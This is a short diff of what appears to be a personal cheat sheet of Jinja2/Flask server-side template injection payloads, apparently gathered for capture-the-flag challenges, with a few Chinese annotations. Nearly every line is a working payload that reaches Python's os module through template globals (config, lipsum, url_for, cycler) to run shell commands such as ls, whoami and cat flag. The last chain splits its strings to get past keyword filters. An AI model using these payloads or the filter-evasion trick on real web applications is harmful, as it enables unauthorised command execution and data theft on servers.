@@ -113,9 +113,12 @@ your input object基类的子类
 
 
 {{config.__class__.__init__.__globals__['os'].popen('ls /').read()}}
+{{lipsum.__globals__['os'].popen('tac ../flag').read()}}
 {{lipsum.__globals__.get("os").popen("cd ..;cd ..;cd ..;ls;cat flag.txt").read()}}
 {{url_for.__globals__.os.popen('whoami').read()}}
 {{lipsum.__globals__.os.popen('whoami').read()}}
+{{cycler.__init__.__globals__.os.popen('ls').read()}}
+
 
 {{ }}
 config|attr('__in''it__')|attr('__glo''bals__')|attr('__geti''tem__')('os')|attr('popen')('ca''t /f''lag')|attr('re''ad')()
